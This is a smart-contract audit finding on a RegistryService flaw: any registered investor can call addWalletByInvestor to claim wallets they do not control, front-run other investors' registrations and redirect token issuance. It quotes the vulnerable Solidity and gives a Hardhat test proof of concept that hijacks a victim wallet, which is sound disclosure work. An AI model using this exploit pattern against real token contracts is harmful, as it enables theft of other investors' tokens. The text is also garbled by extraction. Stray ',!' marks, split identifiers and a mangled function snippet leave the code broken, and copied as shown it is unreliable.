# [C] malicious investor can register wallets that belong to other investors

## Summary
Severity: Critical
Contest weight: 0.0000
Dataset id: 23397
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The addWalletByInvestor function in RegistryService.sol allows any registered investor to claim ownership of any wallet address that is not currently in the investorsWallets mapping. This creates a critical vulnerability where attackers can front‑run legitimate wallet registration transactions to hijack wallet ownership:

```solidity
function addWalletByInvestor(address _address) public override newWallet(_address) returns (bool) {
    require(!getWalletManager().isSpecialWallet(_address), "Wallet has special role");
    string memory owner = getInvestor(msg.sender);
    require(isInvestor(owner), "Unknown investor");
    investorsWallets[_address] = Wallet(owner, msg.sender, msg.sender);
    investors[owner].walletCount++;
    emit DSRegistryServiceWalletAdded(_address, owner, msg.sender);
    return true;
}
```

The function only checks that the caller is a registered investor and that the wallet is not a special wallet, but does not verify that the caller actually controls the wallet address being registered.

With that being say a malicious register investor can front run ( or if he already know what wallet will be regis-
tered) any addWallet, updateInvestor, and addWalletByInvestor call setting the wallet to himself DoSing those
function and possible Redirect token issuances meant for other investors to themselves.

Impact: * addWallet, updateInvestor, addWalletByInvestor in the registry and TokenIssuer:issueTokens
and SecuritySwap:swap functions can be DoS.
• Since the token issuant process is using those wallets to mint tokens( see issueTokensCustom )
function issueTokensCustom(address _to, uint256 _value, uint256 _issuanceTime, uint256 _valueLocked,
string memory _reason, uint64 _releaseTime) // _to could be the wallet that malicious investor just
take
,!
,!
public
virtual
override
returns (
/*onlyIssuerOrAbove*/
bool
)
{...}

## Proof of Concept
```typescript
it('Steal wallet', async function() {
    // victim wallet will be another wallet that the investor2 want to register
    const [owner, investor1, investor2, victimWallet] = await hre.ethers.getSigners();
    const { registryService, dsToken } = await loadFixture(deployDSTokenRegulated);
    // Setup: Register two investors
    await registryService.registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1,
    INVESTORS.INVESTOR_ID.INVESTOR_COLLISION_HASH_1);,!
    await registryService.registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_2,
    INVESTORS.INVESTOR_ID.INVESTOR_COLLISION_HASH_2);,!
    // Setup: Add wallets to investors
    await registryService.addWallet(investor1, INVESTORS.INVESTOR_ID.INVESTOR_ID_1);
    await registryService.addWallet(investor2, INVESTORS.INVESTOR_ID.INVESTOR_ID_2);
    // Verify initial state
    expect(await registryService.getInvestor(investor1.address)).to.equal(INVESTORS.INVESTOR_ID.INV c
    ESTOR_ID_1);,!
    expect(await registryService.getInvestor(investor2.address)).to.equal(INVESTORS.INVESTOR_ID.INV c
    ESTOR_ID_2);,!
    expect(await registryService.isWallet(victimWallet.address)).to.be.false;
    // ATTACK: Investor1 front-runs and steals victimWallet before Investor2 can register it
    const registryServiceFromInvestor1 = await registryService.connect(investor1);
    await registryServiceFromInvestor1.addWalletByInvestor(victimWallet.address);
    // Verify attack succeeded - victimWallet now belongs to Investor1
    expect(await registryService.getInvestor(victimWallet.address)).to.equal(INVESTORS.INVESTOR_ID. c
    INVESTOR_ID_1);,!
    expect(await registryService.isWallet(victimWallet.address)).to.be.true;
    // Now if Investor2 tries to register the same wallet, it will fail
    const registryServiceFromInvestor2 = await registryService.connect(investor2);
    await expect(
        registryServiceFromInvestor2.addWalletByInvestor(victimWallet.address)
    ).to.be.revertedWith("Wallet already exists");
    // Demonstrate token hijacking - issue tokens to victimWallet
    // The tokens will go to Investor1 instead of Investor2
    await dsToken.setCap(1000);
    await dsToken.issueTokens(victimWallet.address, 100);
    // Verify Investor1 received the tokens (through their wallet)
    expect(await dsToken.balanceOf(victimWallet.address)).to.equal(100);
    expect(await registryService.getInvestor(victimWallet.address)).to.equal(INVESTORS.INVESTOR_ID. c
    INVESTOR_ID_1);,!
});
```

## Recommendation
Recommended Mitigation: Remove addWalletByInvestor.
